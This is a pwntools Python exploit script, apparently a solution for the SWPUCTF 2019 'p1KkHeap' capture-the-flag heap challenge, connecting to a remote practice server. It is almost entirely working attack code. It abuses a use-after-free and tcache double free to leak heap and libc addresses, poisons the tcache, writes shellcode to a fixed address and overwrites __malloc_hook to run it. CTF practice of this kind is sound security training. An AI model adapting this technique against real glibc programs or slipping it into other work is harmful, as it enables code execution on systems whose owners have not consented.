from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./SWPUCTF_2019_p1KkHeap"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27718)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size):
    sa("Your Choice: ", "1")
    sa("size: ", str(size))

def show(index):
    sa("Your Choice: ", "2")
    sa("id: ", str(index))

def edit(index, con):
    sa("Your Choice: ", "3")
    sa("id: ", str(index))
    sa("content: ", con)

def free(index):
    sa("Your Choice: ", "4")
    sa("id: ", str(index))


# uaf --> double free

# use shellcode to get shell
context(os="linux", arch="amd64")
code = asm(shellcraft.cat("flag"))
print("code len is : ", hex(len(code)))
c_addr = 0x66660000

# leak heap addr
add(0x80)  # 0
add(0x80)  # 1
free(1)
free(1)
show(1)
rud("content: ")
info = u64(rud("\nDone!").ljust(8, b"\x00"))
print("leak: ", hex(info))

# alloc to tcache entry
entry = (info & 0xfffffffffffff000) + 0x10 
add(0x80)  # 2
edit(2, p64(entry))
add(0x80)  # 3
add(0x80)  # 4 the heap point to tcache entry

# leak libc
free(0)
show(0)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["__malloc_hook"]-0x70
print("base: ", hex(base))
m_hook = base+libc.sym["__malloc_hook"]

# write code to c_addr and alter malloc_hook to c_addr
edit(4, p64(0x0100000001)+p64(0)*7+p64(m_hook)+p64(0)*4+p64(c_addr))
add(0x60)  # 5
edit(5, code)
add(0x10)  # 6
edit(6, p64(c_addr))

# attack
add(0x20)

shell()


